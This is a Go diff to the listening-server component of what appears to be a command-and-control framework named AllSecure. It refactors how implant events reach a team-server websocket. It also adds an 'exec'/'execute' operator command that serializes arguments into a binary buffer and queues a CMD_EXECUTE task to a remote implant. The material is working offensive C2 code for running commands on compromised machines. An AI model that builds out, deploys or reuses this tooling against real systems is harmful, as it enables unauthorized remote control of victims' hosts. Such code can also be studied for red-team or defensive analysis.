@@ -2,7 +2,9 @@ package ListeningServer
 
 import (
 	"AllSecure/ListeningServer/Common"
+	"bytes"
 	"crypto/tls"
+	"encoding/binary"
 	"encoding/json"
 	"github.com/gorilla/websocket"
 	"log"
@@ -83,12 +85,6 @@ func SendEvent(EventName string, ImpCtx Common.ImplantContext, Alive bool, Data 
 			log.Println("[error] attempting to marshal the implant data", err)
 			return err
 		}
-		NewMessage.Message = string(TempData)
-		err = g_clientobj.Conn.WriteJSON(NewMessage)
-		if err != nil {
-			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
-			return err
-		}
 
 		break
 
@@ -101,11 +97,7 @@ func SendEvent(EventName string, ImpCtx Common.ImplantContext, Alive bool, Data 
 			log.Println("[error] attempting to marshal the implant data", err)
 			return err
 		}
-		NewMessage.Message = string(TempData)
-		err = g_clientobj.Conn.WriteJSON(NewMessage)
-		if err != nil {
-			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
-		}
+
 		break
 
 	case "UpdateCheckin":
@@ -117,11 +109,7 @@ func SendEvent(EventName string, ImpCtx Common.ImplantContext, Alive bool, Data 
 			log.Println("[error] attempting to marshal the implant data", err)
 			return err
 		}
-		NewMessage.Message = string(TempData)
-		err = g_clientobj.Conn.WriteJSON(NewMessage)
-		if err != nil {
-			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
-		}
+
 		break
 
 	case "SendModuleData":
@@ -147,16 +135,47 @@ func SendEvent(EventName string, ImpCtx Common.ImplantContext, Alive bool, Data 
 			log.Println("[error] attempting to marshal the implant data", err)
 			return err
 		}
-		NewMessage.Message = string(TempData)
-		err = g_clientobj.Conn.WriteJSON(NewMessage)
-		if err != nil {
-			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
-		}
+
 		break
+
+	case "SendExecuteData":
+		var (
+			ProcID uint32
+			ok     bool
+		)
+		NewMessage.MessageType = "SendExecuteData"
+		NewImplant.ImplantName = ImpCtx.Agent_name
+		NewImplant.LastCheckIn = ImpCtx.LastCheckin.String()
+
+		if Data != nil {
+			if ProcID, ok = Data.(uint32); !ok {
+				log.Println("[error] attempting to cast process ID to int", err)
+				return err
+			}
+		} else {
+			ProcID = 0
+		}
+
+		CombinedData := map[string]interface{}{
+			"ImplantData": NewImplant,
+			"ProcID":      ProcID,
+		}
+		TempData, err = json.Marshal(CombinedData)
+		if err != nil {
+			log.Println("[error] attempting to marshal the implant data", err)
+			return err
+		}
 
 	default:
 		break
 	}
+
+	NewMessage.Message = string(TempData)
+	err = g_clientobj.Conn.WriteJSON(NewMessage)
+	if err != nil {
+		log.Println("[error] attempting to send implant data to the team server web socket connection", err)
+	}
+
 	return nil
 }
 
@@ -190,30 +209,52 @@ func RecvEvent() {
 		case "ImplantCommand":
 			var ImplantCmd Common.ImplantCommandData
 			var AgentCmd Common.AgentCmd
-			var DataBuf []byte
-
-			for _, str := range ImplantCmd.Args {
-				DataBuf = append(DataBuf, []byte(str+" ")...)
-			}
+			var DataBuf bytes.Buffer
 
 			err = json.Unmarshal([]byte(NewWSMessage.Message), &ImplantCmd)
 			if err != nil {
 				log.Println("[error] attempting to unmarshal the implant command data", err)
-				continue
+				break
 			}
-			switch ImplantCmd.Command {
+
+			agent := agent_map[ImplantCmd.ImplantName]
+			AgentCmd.MagicValue = agent.Context.Magic_val
+
+			if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(ImplantCmd.Args))); err != nil {
+				log.Println("[error] attempting to write the number of arguments to the data buffer", err)
+				break
+			}
+
+			for _, str := range ImplantCmd.Args {
+				if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(str))); err != nil {
+					log.Println("[error] attempting to write the length of the argument to the data buffer", err)
+					break
+				}
+				if err = binary.Write(&DataBuf, binary.LittleEndian, []byte(str)); err != nil {
+					log.Println("[error] attempting to write the argument to the data buffer", err)
+					break
+				}
+			}
+
+			switch strings.ToLower(ImplantCmd.Command) {
 			case "lm":
 				AgentCmd.CmdID = Common.CMD_LIST_MODULES
 				AgentCmd.RequestID = 69
-				AgentCmd.DataBuffer = DataBuf
+				AgentCmd.DataBuffer = DataBuf.Bytes()
+				AgentCmd.Size = uint32(DataBuf.Len())
+				break
+			case "exec", "execute":
+				AgentCmd.CmdID = Common.CMD_EXECUTE
+				AgentCmd.RequestID = 69
+				AgentCmd.DataBuffer = DataBuf.Bytes()
+				AgentCmd.Size = uint32(DataBuf.Len())
 				break
 
 			default:
 				break
 			}
 
-			agent := agent_map[ImplantCmd.ImplantName]
-			log.Println("[info] attempting to send command [", ImplantCmd.Command, "] to agent [", agent.Context.Agent_name, "]")
+			log.Println("[info] attempting to send command [", ImplantCmd.Command, "] with args [", ImplantCmd.Args, "] to agent [", agent.Context.Agent_name, "]")
 			agent.CmdQue.Enqueue(AgentCmd)
 
 			break // IMPLANT COMMAND
